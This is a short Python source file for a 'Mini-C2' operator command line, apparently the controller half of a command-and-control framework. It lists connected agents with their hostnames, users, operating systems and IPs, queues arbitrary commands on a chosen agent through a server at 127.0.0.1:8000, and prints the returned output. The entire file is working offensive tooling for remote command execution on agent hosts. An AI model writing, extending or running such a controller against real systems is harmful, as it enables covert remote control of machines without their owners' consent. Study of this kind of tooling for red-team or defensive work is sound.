import argparse 
import time
import requests
from rich.console import Console
from rich.table import Table

SERVER = "http://127.0.0.1:8000"
console = Console()

def list_agents(): 
    r = requests.get(f"{SERVER}/agents")
    agents = r.json()
    
    table = Table(title=f"Connected agents ({len(agents)})")
    table.add_column("ID", style="cyan")
    table.add_column("Hostname")
    table.add_column("User")
    table.add_column("OS")
    table.add_column("IP")
    table.add_column("Last seen", style="dim")

    for a in agents:
        table.add_row(a["id"], a["hostname"], a["username"],
                      a["os"], a["ip"], a["last_seen"])
    console.print(table) 

def task(agent_id: str, command: str):
    r = requests.post(f"{SERVER}/task", json={"agent_id": agent_id, "command": command})
    if r.status_code != 200:
        console.print(f"[red]Error: {r.json().get('error')}[/red]")
        return
    task_id = r.json()["id"]
    console.print(f"[green]✓[/green] Queued task {task_id[:8]}... — polling for result")
    
    for _ in range(30):
        time.sleep(2)
        results = requests.get(f"{SERVER}/results/{agent_id}").json()
        for res in results:
            if res["task_id"] == task_id:
                console.print(f"\n[bold]Output:[/bold]\n{res['output']}")
                return
    console.print("[yellow]Timeout — result will appear in 'results' command later[/yellow]")

def show_results(agent_id: str):
    results = requests.get(f"{SERVER}/results/{agent_id}").json()
    for r in results:
        console.print(f"[cyan]{r['received_at']}[/cyan] (task {r['task_id'][:8]}...)")
        console.print(r["output"])
        console.print("─" * 50)

def main():
    parser = argparse.ArgumentParser(description="Mini-C2 operator CLI")
    sub = parser.add_subparsers(dest="cmd", required=True)
    
    sub.add_parser("agents", help="List connected agents")
    
    p_task = sub.add_parser("task", help="Queue a command on an agent")
    p_task.add_argument("agent_id")
    p_task.add_argument("command")
    
    p_results = sub.add_parser("results", help="Show all results from an agent")
    p_results.add_argument("agent_id")
    
    args = parser.parse_args()
    
    if args.cmd == "agents":
        list_agents()
    elif args.cmd == "task":
        task(args.agent_id, args.command)
    elif args.cmd == "results":
        show_results(args.agent_id)


if __name__ == "__main__":
    main()